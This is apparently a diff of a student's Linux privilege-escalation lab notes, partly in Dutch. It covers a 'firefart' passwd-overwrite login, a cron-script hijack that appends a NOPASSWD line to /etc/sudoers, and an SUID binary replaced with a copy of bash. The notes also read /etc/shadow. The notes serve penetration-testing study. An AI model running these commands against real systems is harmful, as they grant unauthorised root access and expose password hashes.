@@ -271,7 +271,14 @@ to run C you need to install package: sudo apt-get install gcc
 
 FILMPJE VERDER KIJKEN 
 
-
+			  
+a backup of etc password file will be created 
+you can login with firefart (created and has priviliges)
+- su firefart (switch user)
+- Delete ssh key if you get an error 
+- connect over ssh with firefart 
+- apt-get update 
+- cat /etc/shadow 
 
 
 
@@ -299,6 +306,8 @@ Exploiting Misconfigured Cron Jobs:
 
 --- Demo --- 
 
+following compiler can be used to compile exploit code written in C: GCC
+
 voorwerk 
 - Whoami 
 - groups 
@@ -323,24 +332,24 @@ identify cron jobs
   
 - can we add a line of code in the shell script to have the cronjob execute it
 	- cat the shell script to see what it does 	  
-
-	- run: printf '#!/bin/bash\\\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh 
-
+	- run: *printf '#!/bin/bash\\\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh* 
 		- `printf`: It is a command used to format and print text. In this case, it is used to generate the content of the `copy.sh` file.
-	    
 		- `#!/bin/bash`: This is the shebang line, which indicates the interpreter to be used to execute the script. It specifies that the script should be interpreted by the Bash shell (`/bin/bash`).
-	    
 		- `\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers`: This is the content that will be written to the `copy.sh` file. It consists of a newline character (`\n`) followed by the command `echo "student ALL=NOPASSWD:ALL" >> /etc/sudoers`. This command appends the line `"student ALL=NOPASSWD:ALL"` to the `/etc/sudoers` file.
 			- the appended line grants the user "student" the ability to run any command with `sudo` without being prompted for a password on any host.
-	    
-		- `> /usr/local/share/copy.sh`: This redirects the output of the `printf` command, which generates the script's content, and writes it to the file `/usr/local/share/copy.sh`. The `>` operator is used for output redirection and creates or overwrites the file if it already exists.
+		- `> /usr/local/share/copy.sh`: This redirects the output of the `printf` command, which generates the script's content, and writes it to the file `/usr/local/share/copy.sh`. which is the script that is executed by the cronjob. The `>` operator is used for output redirection and creates or overwrites the file if it already exists.
 			- `> /usr/local/share/copy.sh`: This redirects the output of the `printf` command, which generates the script's content, and writes it to the file `/usr/local/share/copy.sh`. The `>` operator is used for output redirection and creates or overwrites the file if it already exists.
-		
+![[Pasted image 20230713113250.png]]
 
+- wait a minute for the cronjob to run; and check all the users that are part of te sudo group: sudo -l 
+- sudo su  (elevate privileges to root)
+- whoami 
+- crontab -l  ( to display the list of scheduled cron jobs for the current user)
 
-
-
-
+In een notendop: 
+1. identify the files or scripts that are used by cronjobs 
+2. identify whether that script can be modified by unprivileged user. 
+3. modified the script where we added a command that adds the unprivileged user to the sudoers file 
 
 
 
@@ -353,11 +362,56 @@ SUID (Set Owner User ID) Permissions:
 - When applied, the SUID permission allows users to execute a script or binary with the permissions of the file owner, rather than the user running the script or binary.
 - SUID permissions are commonly used to allow unprivileged users to run specific scripts or binaries with "root" permissions. However, it's important to note that this privilege is limited to the execution of the script and does not grant overall privilege elevation. Improperly configured SUID binaries can be exploited by unprivileged users to gain elevated access through misconfigurations or vulnerabilities within the binary or script.
 
-Exploiting SUID Binaries:
-
 - The goal is to exploit the SUID functionality to elevate privileges. The success of the attack depends on the following factors:
     - Owner of the SUID binary: We target SUID binaries owned by the "root" user or other privileged users to achieve privilege escalation.
     - Access permissions: Executable permissions are required to execute the SUID binary and exploit its functionality.
+
+-- Demo -- 
+
+- pwd 
+- ls -al (list out all the directories) look at the rights for each dir 
+- find a dir that gives us executable rights but it owned by root 
+ ![[Pasted image 20230713120115.png]]
+- the s permission implies that that the SUID is applied here = executable with root privileges  
+- execute binary: ./welcome
+- perform static analysis on file 
+	- file welcome (see more information about the binary)
+	- strings welcome (list of string within the binary)
+	- find something to use 
+
+- rm greetings 
+- create own greetings binary: cp /bin/bash greetings 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 ## Dumping Linux Password Hashes 
